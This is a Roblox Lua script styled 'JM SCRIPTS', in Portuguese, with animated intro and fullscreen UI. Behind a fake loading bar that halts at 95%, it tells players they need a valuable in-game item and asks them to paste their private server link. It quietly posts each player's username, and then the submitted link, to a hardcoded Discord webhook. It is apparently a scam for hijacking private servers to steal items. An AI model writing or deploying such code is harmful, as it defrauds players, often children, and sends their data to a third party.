--========================
-- CONFIG
--========================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local DISCORD_INVITE = "https://discord.gg/ZPz8Renfz"

--========================
-- SERVICES
--========================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local request =
    (syn and syn.request)
    or http_request
    or request
    or (fluxus and fluxus.request)

--========================
-- WEBHOOK FUNCTION
--========================
local function sendWebhook(msg)
    if not request then return end
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({content = msg})
    })
end

--========================
-- LOG EXECUTION (NOVO)
--========================
sendWebhook("🚀 **SCRIPT EXECUTADO**\n👤 Usuário: "..player.Name)

--========================
-- GUI BASE
--========================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

--========================
-- INTRO
--========================
local intro = Instance.new("Frame", gui)
intro.Size = UDim2.fromScale(1,1)
intro.BackgroundColor3 = Color3.fromRGB(0,0,0)

local introText = Instance.new("TextLabel", intro)
introText.Size = UDim2.fromScale(1,1)
introText.BackgroundTransparency = 1
introText.Font = Enum.Font.Gotham
introText.TextScaled = true
introText.TextColor3 = Color3.fromRGB(200,170,255)
introText.TextTransparency = 1
introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"

TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=0}):Play()
task.wait(2.5)
TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=1}):Play()
task.wait(1)
intro:Destroy()

--========================
-- LOADING FAKE (95%)
--========================
local loading = Instance.new("Frame", gui)
loading.Size = UDim2.fromScale(1,1)
loading.BackgroundColor3 = Color3.fromRGB(5,5,10)

local lText = Instance.new("TextLabel", loading)
lText.Size = UDim2.fromScale(1,0.15)
lText.Position = UDim2.fromScale(0,0.35)
lText.BackgroundTransparency = 1
lText.TextScaled = true
lText.Font = Enum.Font.Gotham
lText.TextColor3 = Color3.fromRGB(200,160,255)
lText.Text = "Carregando sistema..."

local barBg = Instance.new("Frame", loading)
barBg.Size = UDim2.fromScale(0.6,0.03)
barBg.Position = UDim2.fromScale(0.2,0.52)
barBg.BackgroundColor3 = Color3.fromRGB(30,30,50)
Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(170,90,255)
Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

TweenService:Create(bar,TweenInfo.new(6),{Size=UDim2.fromScale(0.95,1)}):Play()
task.wait(7)
loading:Destroy()

--========================
-- MAIN UI (FULLSCREEN)
--========================
local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(1,1)
main.BackgroundColor3 = Color3.fromRGB(6,6,12)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 2

task.spawn(function()
    local t = 0
    while main.Parent do
        t += 0.01
        stroke.Color = Color3.fromHSV(t%1,0.6,1)
        task.wait()
    end
end)

--========================
-- SPARKS
--========================
local sparks = Instance.new("Folder", main)
task.spawn(function()
    while main.Parent do
        local s = Instance.new("Frame", sparks)
        s.Size = UDim2.fromScale(0.003,0.02)
        s.Position = UDim2.fromScale(math.random(),1.1)
        s.BackgroundColor3 = Color3.fromRGB(180,90,255)
        s.BackgroundTransparency = 0.2
        Instance.new("UICorner", s).CornerRadius = UDim.new(1,0)
        TweenService:Create(
            s,
            TweenInfo.new(math.random(3,6),Enum.EasingStyle.Linear),
            {Position = UDim2.fromScale(s.Position.X.Scale,-0.2),BackgroundTransparency=1}
        ):Play()
        task.delay(6,function() s:Destroy() end)
        task.wait(0.15)
    end
end)

--========================
-- TITLE
--========================
local title = Instance.new("TextLabel", main)
title.Size = UDim2.fromScale(1,0.15)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamSemibold
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(190,140,255)

--========================
-- RULE
--========================
local rule = Instance.new("TextLabel", main)
rule.Position = UDim2.fromScale(0.1,0.18)
rule.Size = UDim2.fromScale(0.8,0.07)
rule.BackgroundTransparency = 1
rule.TextScaled = true
rule.Font = Enum.Font.Gotham
rule.TextColor3 = Color3.fromRGB(255,90,90)
rule.Text = "⚠️ OBRIGATÓRIO: ter pelo menos 1 Brainrot de 10M+"

--========================
-- INPUT
--========================
local box = Instance.new("TextBox", main)
box.Position = UDim2.fromScale(0.2,0.35)
box.Size = UDim2.fromScale(0.6,0.08)
box.PlaceholderText = "Cole o link do seu servidor privado"
box.TextScaled = true
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(20,20,35)
box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)
Instance.new("UIStroke", box).Color = Color3.fromRGB(150,90,230)

--========================
-- SEND BUTTON
--========================
local send = Instance.new("TextButton", main)
send.Position = UDim2.fromScale(0.35,0.47)
send.Size = UDim2.fromScale(0.3,0.08)
send.Text = "Enviar"
send.TextScaled = true
send.Font = Enum.Font.GothamSemibold
send.BackgroundColor3 = Color3.fromRGB(140,70,220)
send.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)

send.MouseButton1Click:Connect(function()
    if box.Text == "" then return end
    sendWebhook("🔗 **Server Privado Enviado**\n👤 "..player.Name.."\n📎 "..box.Text)
    send.Text = "Enviado ✔"
end)

--========================
-- DISCORD BUTTON
--========================
local discord = Instance.new("TextButton", main)
discord.Position = UDim2.fromScale(0.35,0.58)
discord.Size = UDim2.fromScale(0.3,0.07)
discord.Text = "Entrar no Discord"
discord.TextScaled = true
discord.Font = Enum.Font.GothamSemibold
discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
discord.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", discord).CornerRadius = UDim.new(0,16)

discord.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(DISCORD_INVITE)
        discord.Text = "Link copiado ✔"
        task.wait(1.5)
        discord.Text = "Entrar no Discord"
    end
end)
